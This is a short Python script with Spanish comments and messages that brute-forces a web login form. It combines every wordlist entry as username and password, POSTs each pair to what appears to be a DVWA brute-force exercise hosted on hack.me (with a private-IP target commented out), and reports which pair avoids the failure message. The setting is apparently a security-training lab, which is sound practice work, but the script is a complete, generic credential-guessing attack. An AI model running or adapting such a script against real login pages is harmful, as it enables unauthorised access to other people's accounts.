import urllib

diccionario = open("diccionario.txt","r").readlines()

conjunto = [[x[:-1],y[:-1]]for x in diccionario for y in diccionario]

#print conjunto

for e in conjunto:
    campos = urllib.urlencode({"username":e[0],"password":e[1],"Login":"Login"})
    #sitio = urllib.urlopen("http://10.20.171.109:8085/seguridad/brute/brute/login.php", campos)
    sitio = urllib.urlopen("http://s53478-101047-hj7.croto.hack.me/vulnerabilities/brute/", campos)
    respuesta = sitio.read()
    print (respuesta)
    if not 'Username and/or password incorrect.' in respuesta:
		print ("----------------------------------------------------")
		print ("Acertamos -> " + "user:" + e[0] + " password:" + e[1])
		print ("----------------------------------------------------")
    else:
        print ("intento fallido -> " + "user:" + e[0] + " password:" + e[1])



